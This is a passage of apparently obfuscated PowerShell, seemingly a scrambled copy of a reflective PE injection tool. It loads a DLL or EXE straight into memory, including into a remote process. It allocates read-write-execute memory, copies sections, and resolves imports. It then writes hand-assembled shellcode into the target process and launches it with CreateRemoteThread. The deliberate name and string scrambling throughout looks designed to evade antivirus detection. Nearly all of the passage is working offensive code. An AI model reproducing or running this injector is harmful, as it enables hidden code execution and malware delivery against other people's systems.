			${r`E`SULt} = ${Win3`2`FUNct`i`OnS}."gEtPrOc`A`dDress"."iNv`okE"(${K`Er`Nel32`H`ANdlE}, ("{2}{1}{0}" -f 'ess','oc','IsWow64Pr'))
			if (${R`e`SULt} -eq  (VarIablE U8m1sF -VA  )::"zE`RO")
			{
				Throw ((("{6}{0}{1}{10}{14}{3}{4}{2}{7}{8}{11}{12}{5}{13}{9}{15}" -f'nQKFt l','ocate IsWo','ess ','ro','c',' ','Could','function',' to determine if targe','2bit or 64bi','w','t pr','ocess is','3','64P','t'))."RepL`Ace"('QKF',[sTRINg][cHAR]39))
			}

			[Bool]${wow64p`R`o`CESS} = ${f`Alse}
			${S`UCceSS} = ${WIN32`FUN`cTio`NS}."I`SWow64`p`ROCESs"."In`VOKe"(${R`Em`OTeprOc`HAn`dle}, [Ref]${WoW64p`RoC`E`SS})
			if (${Su`cC`ESS} -eq ${fal`sE})
			{
				Throw ("{5}{0}{4}{1}{6}{2}{3}" -f' to IsWow6','Proce','s ','failed','4','Call','s')
			}

			if ((${WOW64p`RoC`E`sS} -eq ${t`RUE}) -or ((${W`Ow64Proc`eSs} -eq ${F`A`lse}) -and ( (GET-VariabLe ('GM'+'qK')  ).VaLUE::"SiZE`Of"([Type][IntPtr]) -eq 4)))
			{
				${Pr`OcE`sS`64BiT} = ${Fal`Se}
			}

			
			${pO`WeRS`hell64biT} = ${T`RUe}
			if (  (vARIABLe gmQK  -VAluEON )::"SIz`EoF"([Type][IntPtr]) -ne 8)
			{
				${pOwERShe`ll64B`IT} = ${FA`lSe}
			}
			if (${Po`w`E`RShEll64`BIt} -ne ${Pr`Oc`e`SS6`4BiT})
			{
				throw ("{21}{1}{0}{24}{18}{5}{23}{15}{20}{3}{9}{16}{11}{19}{17}{13}{14}{8}{10}{7}{22}{4}{2}{6}{12}"-f 't b',' mus','m','re (x8','d re','ch','ote ','ed a','ng l','6/x','oad','4','process','PE b','ei','ec','6','as ','me ar',') ','tu','PowerShell','n','it','e sa')
			}
		}
		else
		{
			if (  ${G`mqk}::"si`ZE`of"([Type][IntPtr]) -ne 8)
			{
				${Pr`Oce`ss64Bit} = ${fa`L`Se}
			}
		}
		if (${P`RO`c`ess64Bit} -ne ${pein`Fo}."Pe`64`BIt")
		{
			Throw ((("{8}{10}{3}{12}{0}{4}{13}{7}{2}{16}{14}{9}{11}{5}{1}{15}{6}"-f 'o',' loaded in ','t matc','r','e','is being','t)','0}','PE p','itecture of the process i','latfo','t ','m d','sn{','he arch','(32/64bi','h t')) -f  [Char]39)
		}


		
		&("{1}{3}{0}{2}"-f'Ve','Writ','rbose','e-') ("{2}{3}{6}{5}{1}{8}{10}{9}{0}{7}{4}"-f'ad','he PE an','A','ll','o memory',' for t','ocating memory','ers t','d ','e its he','writ')

        
		[IntPtr]${Lo`ADad`dr} =  ${u`8M1`Sf}::"Z`ero"
        ${peS`U`PP`ORtSaslR} = ([Int] ${P`EIN`FO}."DLlC`harA`c`TE`RiStiCs" -band ${WIN`3`2`c`onsTAntS}."ImA`Ge_d`LLcH`A`RAC`TErIs`T`IC`s`_`dYnaMiC_ba`se") -eq ${wi`N`32COn`s`TaNtS}."Im`AGe_dl`L`cHARACT`erI`stI`CS`_dY`Na`mi`C_bAsE"
		if ((-not ${f`oRCE`AslR}) -and (-not ${Pe`sUPpO`R`T`SAslr}))
		{
			&("{3}{1}{0}{2}"-f 'a','-W','rning','Write') (("{47}{28}{22}{14}{13}{31}{32}{25}{8}{43}{7}{24}{41}{37}{2}{33}{5}{27}{36}{20}{30}{6}{11}{23}{9}{3}{0}{21}{42}{44}{34}{45}{48}{12}{4}{15}{16}{29}{17}{1}{46}{40}{26}{10}{39}{38}{18}{35}{19}" -f ' ','For','f t','g',' us','e lo','f','not','ly lo','tin','g ','ails, ','ry','ec','eing refl','ing',' ','e -','ld ca','e crashes)','g','Po','b','try restar',' A','e','la','a','e ','th',' ','ti','v','h',' an','us','din','mpatible. I','ou','(c',' f','SLR co','werSh','aded is ','ell','d trying agai','ceASLR','PE fil','n OR t')) -WarningAction ("{2}{1}{0}" -f'ue','ntin','Co')
			[IntPtr]${lo`AD`Addr} = ${orIG`inAli`maGe`BaSe}
		}
        elseif (${fORce`AS`lR} -and (-not ${pes`UPPORt`sa`S`lr}))
        {
            &("{1}{3}{2}{0}"-f 'e','Write','Verbos','-') ((("{17}{7}{5}{9}{4}{13}{10}{2}{20}{0}{1}{14}{18}{6}{16}{3}{19}{12}{8}{11}{21}{15}" -f 'SL','R b','r',' ','e',' fi','eASLR is set. Forc','E',' file. Thi','le do','t suppo','s could result i','PE','snVBo','u',' crash.','ing ASLR on','P','t -Forc','the ','t A','n a'))-CrEPLaCE 'VBo',[ChAR]39)
        }

        if (${fO`RceAS`LR} -and ${r`e`M`OTElOad`ING})
        {
            &("{0}{1}{2}" -f 'Wr','ite-Err','or') ("{3}{0}{2}{6}{5}{7}{4}{8}{9}{1}"-f'nno','cess.','t ','Ca','emote ',' ForceASLR when loading in to a','use',' r','pr','o') -ErrorAction ("{1}{0}" -f'p','Sto')
        }
        if (${RE`mOt`E`loadi`NG} -and (-not ${pesu`PpO`RTs`ASLr}))
        {
            &("{2}{0}{1}"-f '-Erro','r','Write') ((("{14}{13}{9}{1}{2}{19}{3}{6}{10}{20}{12}{17}{7}{16}{18}{8}{0}{5}{15}{4}{11}"-f'emo','u','p','SLR','oces','te p','. Cannot load ',' PE ','a r','nk4ot s','a','s','-','es','PE do','r','in ','ASLR','to ','port A',' non'))."reP`La`CE"(([CHaR]107+[CHaR]52+[CHaR]111),[strIng][CHaR]39)) -ErrorAction ("{1}{0}" -f 'p','Sto')
        }

		${p`ehan`dLE} =  ${U`8M1Sf}::"z`ErO"				
		${E`F`FECTIv`EpEh`AndlE} =   (Gci  VaRIablE:u8m1SF).vaLUE::"Ze`Ro"		
		if (${rE`moTelo`A`diNG} -eq ${T`Rue})
		{
			
			${pe`hA`N`Dle} = ${wIN3`2FUNcT`ions}."vI`RTU`Al`AlLOC"."in`VO`ke"(  (gEt-VaRIabLE  u8m1Sf ).VaLUe::"ZE`RO", [UIntPtr]${P`ei`NFo}."SI`Z`EOFiM`Age", ${Wi`N32cO`NSt`ANts}."mEM_c`o`mmIt" -bor ${W`in32co`N`S`TANTs}."MEM`_RES`E`RvE", ${wIn32C`o`NS`TAnTs}."paGE`_REaDW`RI`TE")

			
			${eF`F`eCtIVep`E`haNDLe} = ${wIN`3`2FuN`C`TiOnS}."V`I`RT`U`AlAllOcex"."I`N`VOKE"(${reMotEpr`o`CHAn`DLE}, ${lO`ADa`DDr}, [UIntPtr]${Pe`In`Fo}."Si`ZEOf`I`MAge", ${wIN32`C`on`S`TANTS}."Mem`_`cOmMIt" -bor ${wiN3`2`Co`NsTan`TS}."Mem_rES`e`RVe", ${WIn32c`oNS`TA`Nts}."PA`gE_`execuT`e_REA`dw`RITe")
			if (${E`FfEcTiVeP`eH`A`NDLe} -eq  (ItEM ("V"+"Ar"+"iable:U8"+"m1"+"sF") ).VALuE::"Z`ERo")
			{
				Throw ((("{38}{17}{29}{31}{22}{19}{18}{35}{28}{4}{16}{11}{27}{14}{36}{34}{15}{0}{5}{23}{25}{2}{30}{21}{20}{33}{24}{8}{37}{9}{32}{6}{12}{3}{13}{7}{26}{1}{10}" -f'r',' in us','ould','h','s','t ASLR','ddr','i','uest','base','e','th','ess of t','e PE ','l','t suppo','. If ',' ',' remote p','he',' that ','e','mory in t',', i',' req','t c','s already','e PE being ','es','alloc',' b','ate me',' a','the','d doesnep2','roc','oade','ed ','Unable to')) -CrEpLAce'ep2',[cHAr]39)
			}
		}
		else
		{
			if (${N`xcOM`PatIbLe} -eq ${T`RUE})
			{
				${pEHa`ND`le} = ${win32Fun`cT`I`O`NS}."VirtU`Alall`OC"."INVo`kE"(${LOa`dAdDR}, [UIntPtr]${pE`iNFo}."S`IZe`OfIM`AGe", ${w`In`32cOnsT`ANts}."Me`M_CO`MmIT" -bor ${W`in32cons`Ta`NtS}."MeM`_`Re`servE", ${wIN32`co`NSTan`Ts}."PaGE_`READW`RITe")
			}
			else
			{
				${PE`hand`le} = ${Wi`N32Fun`cTiO`Ns}."VIR`TualALL`OC"."i`NV`oke"(${lo`ADa`DDr}, [UIntPtr]${p`eiNFO}."SIze`OfIm`A`Ge", ${W`IN32co`NST`AN`TS}."MEm_`cO`mM`It" -bor ${Wi`N32`c`ONs`TantS}."MEm`_R`Ese`RvE", ${W`IN32CONsTa`N`Ts}."pAGE_EXeCu`TE_r`eA`DwR`ITe")
			}
			${eF`FE`CtiVE`PEHAnDle} = ${P`E`HANd`Le}
		}

		[IntPtr]${peENd`Ad`DrE`sS} = &("{1}{6}{3}{0}{4}{5}{2}"-f 'dI','A','nsigned','e','nt','AsU','dd-Sign') (${PehAn`D`Le}) ([Int64]${pEIn`FO}."SizeOFIm`A`GE")
		if (${P`E`hAndle} -eq   ( VARIaBlE  u8M1SF  -VA )::"z`ero")
		{
			Throw ("{22}{63}{28}{55}{16}{46}{61}{37}{35}{47}{9}{54}{27}{2}{3}{34}{50}{30}{53}{14}{40}{17}{15}{8}{0}{38}{21}{51}{57}{7}{24}{13}{41}{25}{58}{62}{11}{60}{26}{64}{44}{52}{6}{39}{18}{4}{43}{42}{19}{23}{31}{49}{48}{59}{1}{45}{10}{29}{20}{33}{5}{12}{36}{32}{56}"-f ' in a','he PE ','ASLR ','comp','nt',' ','di','ell pro','t','. If P','a','rSh','b','ess','unn',' scrip','e','g the','re','ry layout, ','s m','e','Virtual','s','c','(the new','process','ot ',' f','nt',', tr','o t',' ','ight','atibl','e memory fo','e','ocat',' new Pow','ffe','in',' ','mo',' me','hav','w','d to al','r PE',' addr','he','e','r','e a ','y r','E is n','ail','free).','Sh',' Po','ess t','ell ','l','we','Alloc',' will ')
		}
		  (gEt-variAbLE  gmqk  -va )::("{1}{0}" -f 'opy','C').Invoke(${peby`T`ES}, 0, ${p`EhA`NDLe}, ${p`EInFo}."SI`Ze`OFHeAdErs") | &("{0}{1}{2}" -f'Out-','Nul','l')


		
		&("{3}{1}{2}{0}{4}" -f 'bo','V','er','Write-','se') ("{12}{11}{7}{6}{3}{14}{1}{10}{9}{8}{4}{0}{5}{13}{2}"-f 'd in','on from th','y','fo','ade',' mem','n','PE i','rs lo','eade','e h','tailed ','Getting de','or','rmati')
		${pE`In`FO} = &("{3}{4}{2}{0}{1}"-f'ile','dInfo','-PEDeta','Ge','t') -PEHandle ${Pe`h`AN`Dle} -Win32Types ${wiN`32`TyPEs} -Win32Constants ${WiN32C`Ons`TA`N`Ts}
		${peIN`Fo} | &("{0}{1}{2}" -f 'Ad','d-M','ember') -MemberType ("{1}{0}{2}" -f 'eProper','Not','ty') -Name ("{2}{0}{1}" -f 'Add','ress','End') -Value ${pEeND`Ad`DRESS}
		${PE`iNFo} | &("{1}{2}{0}"-f'ber','Add-Me','m') -MemberType ("{0}{2}{3}{1}"-f 'No','ty','tePrope','r') -Name ("{0}{3}{2}{1}"-f 'Eff','dle','ePEHan','ectiv') -Value ${Ef`F`e`cTi`V`ePeHandLe}
		&("{0}{1}{3}{4}{2}" -f 'Wri','t','bose','e','-Ver') "StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress) "


		
		&("{0}{1}{3}{2}"-f 'Wri','te-Ver','ose','b') ("{0}{4}{1}{2}{6}{5}{3}"-f'C','c','tions',' to memory','opy PE se','in',' ')
		&("{1}{3}{2}{0}" -f'ons','C','ecti','opy-S') -PEBytes ${p`e`ByTes} -PEInfo ${PEi`N`Fo} -Win32Functions ${w`i`N32`Fu`NCTiOns} -Win32Types ${win32`T`ypeS}


		
		&("{3}{0}{2}{1}"-f'-Verb','se','o','Write') ("{9}{17}{20}{6}{2}{15}{5}{10}{13}{16}{19}{11}{12}{4}{3}{7}{14}{18}{0}{8}{1}"-f'd i','mory',' ','c',' a','ses based ','ory','t','n me','Upd','o','e','re the PE was','n','ually','addres',' ','at',' loade','wh','e mem')
		&("{4}{3}{5}{0}{2}{1}{6}" -f'm','dre','oryAd','pdate','U','-Me','sses') -PEInfo ${pE`INFO} -OriginalImageBase ${O`RI`GINaL`IMageb`Ase} -Win32Constants ${WI`N32`coNs`TANTS} -Win32Types ${WI`N3`2Ty`pES}


		
		&("{2}{0}{1}"-f'te-Ver','bose','Wri') ((("{1}{4}{8}{7}{3}{0}{5}{9}{2}{6}" -f 'w','Impo','l',' PE ','rt DLL8mxs ','e','oading','eded by the','ne',' are '))."ReplA`cE"(([ChAR]56+[ChAR]109+[ChAR]120),[stRINg][ChAR]39))
		if (${RE`mOTelo`AD`ing} -eq ${T`RUE})
		{
			&("{1}{5}{4}{0}{3}{2}" -f 'or','Impor','s','t','llImp','t-D') -PEInfo ${Pe`INfO} -Win32Functions ${WI`N3`2fU`NCTi`Ons} -Win32Types ${wi`N32tY`P`es} -Win32Constants ${wIn32cO`N`s`TAnTS} -RemoteProcHandle ${rEm`ot`EP`RoCHanDLE}
		}
		else
		{
			&("{4}{3}{0}{2}{1}"-f 't-Dll','mports','I','mpor','I') -PEInfo ${PEI`Nfo} -Win32Functions ${W`In32F`UN`cTionS} -Win32Types ${wiN32`TyP`es} -Win32Constants ${Win32`CoNsT`AntS}
		}


		
		if (${rEm`OtEL`o`Adi`Ng} -eq ${fa`lSE})
		{
			if (${nxC`omPaTIb`lE} -eq ${Tr`UE})
			{
				&("{2}{0}{1}"-f't','e-Verbose','Wri') ("{8}{2}{6}{1}{5}{3}{0}{7}{4}" -f'n','mory pr',' ','tio','flags','otec','me',' ','Update')
				&("{1}{0}{8}{3}{2}{4}{5}{7}{6}" -f'pdate-Me','U','rotect','yP','ionF','l','gs','a','mor') -PEInfo ${p`Ein`Fo} -Win32Functions ${W`IN3`2f`UNcTIONs} -Win32Constants ${wI`N32c`ONS`TAnTS} -Win32Types ${wI`N32`TyPeS}
			}
			else
			{
				&("{0}{1}{2}"-f 'Write-V','e','rbose') ("{4}{18}{5}{17}{14}{10}{20}{6}{7}{15}{2}{9}{3}{11}{8}{0}{1}{19}{13}{12}{16}"-f'ory,',' ke','ot com','le wi','PE',' ','ely',' l','h NX mem','patib','fle','t',' rea','y as','e','oaded is n','d write execute','r',' being','eping memor','ctiv')
			}
		}
		else
		{
			&("{2}{1}{3}{4}{0}"-f'e','ite-V','Wr','e','rbos') ("{0}{6}{16}{5}{8}{11}{17}{15}{10}{9}{2}{3}{7}{19}{13}{20}{18}{1}{21}{12}{14}{4}"-f 'P','memo','s, n','ot ','s','being l','E','ad','oa','es','c','ded ','permissi','ti','on','o a remote pro',' ','in t',' ','jus','ng','ry ')
		}


		
		if (${Re`m`oTElO`A`DiNG} -eq ${Tr`Ue})
		{
			[UInt32]${Nu`mby`Tes`WrItT`EN} = 0
			${SuCc`E`Ss} = ${wIN3`2fUNC`TiONS}."wrI`TePro`cE`SSm`eMo`Ry"."INVO`kE"(${re`moTEpR`OcH`A`NDLe}, ${e`FF`eC`T`IvEPEH`AnDLE}, ${peh`ANd`le}, [UIntPtr](${Pei`NfO}."size`of`im`Age"), [Ref]${nUmB`yt`EsW`RiT`TEn})
			if (${S`UcC`ESs} -eq ${fAl`sE})
			{
				Throw ("{9}{0}{3}{5}{8}{2}{4}{7}{10}{6}{1}"-f'e','.','remote proc','llc','es','ode to','y','s memo',' ','Unable to write sh','r')
			}
		}


		
		if (${pe`iNfo}."FiLEt`YPe" -ieq "DLL")
		{
			if (${remot`ELo`AdinG} -eq ${fA`L`sE})
			{
				&("{0}{3}{1}{2}"-f 'Writ','rb','ose','e-Ve') ("{7}{6}{1}{3}{4}{8}{11}{9}{10}{5}{2}{0}" -f 'n loaded',' dll','e','main',' ','has be','ing','Call','so',' i','t ',' the DLL knows')
				${dLL`MA`iNPTR} = &("{4}{5}{1}{6}{3}{0}{2}"-f 'sUns','n','igned','A','Add-Sig','nedI','t') (${PeI`Nfo}."p`EHa`NDlE") (${pEi`Nfo}."IMAGe_nT_HEA`dE`RS"."opt`iOnAl`head`ER"."ADDR`eSs`of`En`T`RYPOiNT")
				${dl`Lm`AinDelEG`Ate} = &("{4}{0}{1}{3}{2}" -f 'ate','T','pe','y','Get-Deleg') @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				${dl`LMaIN} =   ${G`MQK}::("{5}{3}{2}{1}{4}{0}" -f'r','orFunc','teF','ega','tionPointe','GetDel').Invoke(${dLlm`Ai`N`pTr}, ${DlL`Ma`indELeg`A`TE})

				${dLlMa`in}."IN`VO`Ke"(${p`e`iNFO}."pE`hand`Le", 1,  ${u8`M1sF}::"zE`RO") | &("{0}{1}{2}"-f 'Ou','t','-Null')
			}
			else
			{
				${D`l`lMAiNpTr} = &("{5}{3}{0}{6}{1}{4}{2}" -f'ignedI','sU','ed','dd-S','nsign','A','ntA') (${EFfECTIV`EPE`Ha`NDLe}) (${pEI`NFO}."imag`e_N`T`_HE`AdERs"."opT`iONaLH`eAD`eR"."ad`DRE`SsofEN`Try`poI`Nt")

				if (${p`Ei`NFo}."pE6`4BIt" -eq ${tR`UE})
				{
					
					${C`ALld`LlmAI`NS`c1} = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					${cA`lldL`L`MA`InSC2} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					${c`AlLD`lLMains`C3} = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					
					${c`ALLdL`lMaIN`Sc1} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					${c`AlLDl`lMa`iNsc2} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					${cA`l`l`DLLMAins`C3} = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				${scLE`NGTH} = ${CaLLdl`l`maIn`S`c1}."LeNG`TH" + ${C`ALlD`L`LMaINsc2}."len`gTH" + ${calL`dlL`M`Ains`C3}."LE`NGTh" + (${pTR`S`IZE} * 2)
				${sCPS`m`eM} =   (  GeT-ITeM ('VaR'+'iA'+'bLe:GmQK')  ).VaLue::("{1}{2}{0}" -f 'l','AllocHGlo','ba').Invoke(${S`C`leNgth})
				${S`cpsMeMOri`GIn`AL} = ${Sc`p`SMem}

				&("{2}{0}{5}{1}{4}{3}" -f 'e-','e','Writ','y','sToMemor','Byt') -Bytes ${CAL`lDll`mAIN`Sc1} -MemoryAddress ${sCpsm`eM}
				${sC`p`smem} = &("{2}{5}{3}{1}{4}{6}{0}" -f'igned','S','A','d-','i','d','gnedIntAsUns') ${S`C`psmem} (${cAL`lDll`mAIN`Sc1}."len`G`Th")
				 (  VARIAbLe ("gMq"+"K") ).VALue::("{3}{4}{0}{1}{2}"-f'uct','ur','eToPtr','St','r').Invoke(${EfFeCT`iv`E`PEh`A`NdlE}, ${s`cPs`mEM}, ${f`AlsE})
				${s`CpS`meM} = &("{2}{1}{3}{0}"-f'dIntAsUnsigned','-Si','Add','gne') ${s`CpSM`em} (${pt`R`SizE})
				&("{1}{2}{0}{4}{3}" -f 'e','Write','-BytesToM','ry','mo') -Bytes ${Ca`l`lDlLMaINs`c2} -MemoryAddress ${ScPs`Mem}
				${SCps`mEM} = &("{3}{2}{0}{6}{5}{1}{4}" -f '-S','e','dd','A','d','dIntAsUnsign','igne') ${Sc`pSm`Em} (${C`ALLD`Llm`AinsC2}."leNG`Th")
				 ( vArIAbLe  ('gM'+'QK')).VAluE::("{0}{3}{2}{1}" -f 'St','oPtr','uctureT','r').Invoke(${DL`Lm`AinpTR}, ${Sc`Ps`MEm}, ${FA`LSE})
				${S`Cp`SmEM} = &("{1}{2}{0}{4}{3}"-f 'nedIntAsUnsi','Add-S','ig','ed','gn') ${s`CpSM`Em} (${P`TR`SIZe})
				&("{3}{4}{1}{2}{0}" -f'ory','Byt','esToMem','Write','-') -Bytes ${cA`L`lDLLMAINs`c3} -MemoryAddress ${SC`P`SmeM}
				${Sc`PSMem} = &("{0}{1}{6}{5}{4}{2}{3}"-f 'Add-Si','gnedIn','ne','d','ig','AsUns','t') ${s`C`PSmeM} (${Call`DL`lmaiNSc3}."l`EnGTH")

				${rS`CADdR} = ${wiN32FU`NcTI`ons}."viRTU`ALAllO`C`eX"."iNvO`Ke"(${REM`Ot`EPro`c`hANd`le},  (  gEt-vArIAbLE ('u8m'+'1s'+'f') -VAlUE )::"z`eRO", [UIntPtr][UInt64]${sCLen`G`Th}, ${wIn32CO`Ns`TA`N`TS}."MEm_C`om`MiT" -bor ${wi`N`32`c`oNstAnts}."Mem_Rese`R`VE", ${wiN3`2co`N`sT`Ants}."pAGe`_E`xEC`UtE_REadwR`i`Te")
				if (${r`S`caDdR} -eq  ( Get-VaRiABLe ('U'+'8M1sf')  -VaLUeoNly )::"Z`ero")
				{
					Throw ("{6}{8}{4}{1}{7}{2}{10}{3}{0}{5}{9}{11}"-f 'te process fo','loc','mory','n the remo','to al','r','Un','ate me','able ',' s',' i','hellcode')
				}

				${S`UCCESs} = ${wIn32`FU`N`cT`iONs}."wRi`TEP`ROCES`SmE`Mory"."IN`VOKE"(${reMote`PRo`c`HandLE}, ${Rsc`A`DDr}, ${ScpS`M`emOR`IgINaL}, [UIntPtr][UInt64]${S`cL`e`NgTh}, [Ref]${nUMBy`TES`w`RiT`TeN})
				if ((${S`U`CCEsS} -eq ${fAL`Se}) -or ([UInt64]${nUMBYTES`WrI`T`T`EN} -ne [UInt64]${sclE`Ng`Th}))
				{
					Throw ("{11}{13}{8}{1}{2}{7}{6}{10}{5}{9}{4}{0}{12}{3}" -f 'm',' wri','t','y.',' re','de','shell','e ','to',' to','co','Unable','ote process memor',' ')
				}

				${rThRe`ADh`ANDLe} = &("{2}{1}{3}{0}"-f'ad','reate-RemoteT','C','hre') -ProcessHandle ${ReMoT`E`PRoc`hAn`dLe} -StartAddress ${r`sC`Addr} -Win32Functions ${wIn32`F`Unc`TiO`Ns}
				${R`ESult} = ${WIN32`F`UnC`TiOnS}."wa`itF`o`Rsi`NGLEO`B`jEct"."i`NvoKe"(${Rt`hREa`DH`Andle}, 20000)
				if (${R`e`SuLT} -ne 0)
				{
					Throw ("{4}{10}{0}{12}{5}{8}{3}{2}{11}{7}{9}{6}{13}{1}" -f'CreateRe','ailed.',' Ge','to call','Call to','teTh','s','c','read ','Addres',' ','tPro','mo',' f')
				}

				${wIN`3`2f`UnCtiONS}."V`IR`TUalFrEe`EX"."In`Vo`kE"(${R`EmOTe`pROcH`ANDle}, ${RsC`A`ddR}, [UIntPtr][UInt64]0, ${wiN`32CO`NsTaNts}."meM_`R`el`eAse") | &("{2}{1}{0}"-f'll','-Nu','Out')
			}
		}
		elseif (${peIn`FO}."F`ilEtYPE" -ieq "EXE")
		{
			
			[IntPtr]${E`Xed`ONeB`YTeP`TR} =   ( vArIabLE gMQK).vALUE::("{0}{2}{1}" -f'AllocHG','al','lob').Invoke(1)
			 ${Gm`qk}::("{1}{0}{2}"-f'rite','W','Byte').Invoke(${E`XEDO`N`eb`YTEPtr}, 0, 0x00)
			${O`VerWRItTenm`emI`NFO} = &("{1}{4}{3}{0}{2}{5}" -f 'Fun','Up','ct','xe','date-E','ions') -PEInfo ${P`eIN`FO} -Win32Functions ${WIN32f`UNc`TIO`Ns} -Win32Constants ${Win32`cOnsta`N`TS} -ExeArguments ${e`XeAR`GS} -ExeDoneBytePtr ${E`xe`Donebyt`Eptr}

			
			
			[IntPtr]${EXEMA`i`NPtr} = &("{2}{5}{3}{1}{4}{0}"-f'ed','g','Add-SignedI','nsi','n','ntAsU') (${PEi`N`Fo}."p`EHaN`dle") (${P`EInfo}."I`mAge_NT_he`A`deRS"."oPTiONAl`h`e`A`DeR"."a`D`D`ReSsOfenTrYPO`INt")
			&("{3}{0}{1}{2}" -f'r','ite-Verb','ose','W') "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in. "

			${wIn`3`2fUnctIonS}."createt`Hr`eAd"."I`NVoKE"(  (  itEm  ('Vari'+'a'+'BlE:U8M1s'+'f')  ).ValuE::"zE`RO",  ( gET-vARiAblE  U8M1SF ).VaLue::"ze`RO", ${E`XeMaiNP`Tr},   ${U`8`m1SF}::"zE`Ro", ([UInt32]0), [Ref]([UInt32]0)) | &("{2}{1}{0}" -f 'll','Nu','Out-')

			while(${TR`Ue})
			{
				[Byte]${Th`REa`D`DoNE} =   ${gM`Qk}::("{1}{2}{0}"-f 'te','Re','adBy').Invoke(${exEdon`EBYTe`P`TR}, 0)
				if (${TH`R`EA`dDoNe} -eq 1)
				{
					&("{3}{2}{5}{1}{0}{4}" -f'MemAddress','f','a','Copy-Arr','es','yO') -CopyInfo ${ov`erwRiT`TE`NmEminfo} -Win32Functions ${WI`N32fuN`cT`IoNS} -Win32Constants ${WIN32co`N`StaN`TS}
					&("{0}{3}{2}{1}"-f 'Wri','se','Verbo','te-') ("{4}{1}{0}{6}{5}{3}{2}"-f ' thr','E','d.',' complete','EX',' has','ead')
					break
				}
				else
				{
					&("{1}{2}{0}"-f '-Sleep','S','tart') -Seconds 1
				}
			}
		}

		return @(${pEIN`FO}."PE`hAnD`lE", ${EFfecTiVePE`H`A`N`d`Le})
	}


	Function in`VOKE-Mem`oR`yfR`eELiBrarY
	{
		Param(
		[Parameter(poSiTiON=0, MAndATOrY=${Tr`Ue})]
		[IntPtr]
		${pEhAN`D`Le}
		)

		
		${WiN32COn`s`T`AntS} = &("{0}{1}{2}{3}{4}"-f 'Get-','W','in32Co','n','stants')
		${Wi`N32`FU`Nct`IoNs} = &("{4}{2}{1}{5}{3}{0}"-f'ns','in32','et-W','o','G','Functi')
		${WIn`3`2typES} = &("{3}{4}{2}{1}{0}"-f 'es','n32Typ','-Wi','G','et')

		${PeiN`FO} = &("{2}{1}{3}{0}" -f 'dInfo','ail','Get-PEDet','e') -PEHandle ${P`EH`ANdlE} -Win32Types ${Win32`TY`PeS} -Win32Constants ${Wi`N32`c`ONSTaN`Ts}

		
		if (${PeIN`Fo}."iMage_`NT_`hea`dE`RS"."op`T`IONalhE`AD`er"."iMpo`RTT`ABLe"."SI`zE" -gt 0)
		{
			[IntPtr]${IMPOrT`de`SC`RIPt`ORP`Tr} = &("{2}{3}{0}{4}{1}{5}" -f 'd-Signed','sign','A','d','IntAsUn','ed') ([Int64]${peI`NfO}."PEHa`N`Dle") ([Int64]${Pe`I`NfO}."ImAGe_NT`_hE`A`Ders"."optI`oNAL`hEA`dEr"."IM`p`oRT`TabLe"."vI`RT`UalaD`DRE`SS")

			while (${T`RuE})
			{
				${i`M`POr`Tde`sC`RipToR} =   ( VArIaBLE  GmQK  -vALuEo  )::"PT`RT`ost`RUC`Ture"(${impOr`TDeSc`RiP`T`oRPtR}, [Type]${win`3`2TYPES}."I`M`A`Ge_Im`pO`Rt_dEscRi`ptor")

				
				if (${I`M`poRtDEsCRi`pTOR}."C`hAraCTE`RIsTi`Cs" -eq 0 `
						-and ${i`M`PoRTdesCRiPT`OR}."FIr`sTtHu`NK" -eq 0 `
						-and ${iMPOrtD`Es`C`RI`P`ToR}."Fo`RwA`Rd`erChAiN" -eq 0 `
						-and ${ImPorTdES`c`RI`P`T`OR}."n`AmE" -eq 0 `
						-and ${Imp`oR`TD`ES`cripToR}."Timedat`eSt`A`MP" -eq 0)
				{
					&("{1}{3}{0}{2}"-f 'e-Verbo','Wr','se','it') ("{3}{7}{6}{1}{2}{4}{0}{5}" -f'b','ries n','e','Done ','eded ','y the PE',' libra','unloading the')
					break
				}

				${i`MPoRT`DlL`pAtH} =  ( vArIaBle  ('gMQ'+'K')  ).vaLue::("{1}{0}{2}"-f 'ToStringAn','Ptr','si').Invoke((&("{4}{0}{1}{3}{2}"-f'n','tAsU','ned','nsig','Add-SignedI') ([Int64]${p`EINfO}."P`EHaNd`lE") ([Int64]${ImPo`RTDEScrI`pt`or}."NA`Me")))
				${I`MPorTDl`L`hAndle} = ${WIn32f`Unc`TIoNs}."geTMo`dULE`h`A`NDlE"."i`N`Voke"(${iM`poRt`D`L`lpatH})

				if (${iMp`oRTdll`HA`NdLe} -eq ${nu`ll})
				{
					&("{1}{2}{3}{0}"-f 'ing','Writ','e','-Warn') ('Er'+'r'+'or '+'get'+'t'+'ing '+'DL'+'L '+'ha'+'ndl'+'e '+'in'+' '+'Me'+'moryFreeLib'+'r'+'ary, '+'D'+'LLN'+'ame'+': '+"$ImportDllPath. "+'Co'+'nti'+'nu'+'ing '+'anyw'+'ays') -WarningAction ("{2}{0}{1}"-f'in','ue','Cont')
				}

				${SUc`ce`Ss} = ${W`IN32fUN`ct`IOnS}."f`ReEL`IBr`ARy"."iN`VOkE"(${i`m`poRTDLl`HanDLe})
				if (${s`UCcesS} -eq ${fa`LsE})
				{
					&("{2}{1}{0}{3}" -f'nin','War','Write-','g') ('Un'+'able'+' '+'t'+'o '+'free'+' '+'library'+': '+"$ImportDllPath. "+'Cont'+'inuin'+'g'+' '+'any'+'ways.') -WarningAction ("{2}{0}{1}"-f 'n','tinue','Co')
				}

				${Im`Po`RTdEscRiPToR`PTR} = &("{0}{1}{2}{3}{4}" -f'Add-Sig','nedIn','tAsUn','signe','d') (${Im`PO`RtDESC`RiPtOrp`Tr}) (  ${g`MqK}::"SIz`EOF"([Type]${wi`N3`2TY`pES}."iM`AGE`_iMpOrT_De`scRipT`oR"))
			}
		}

		
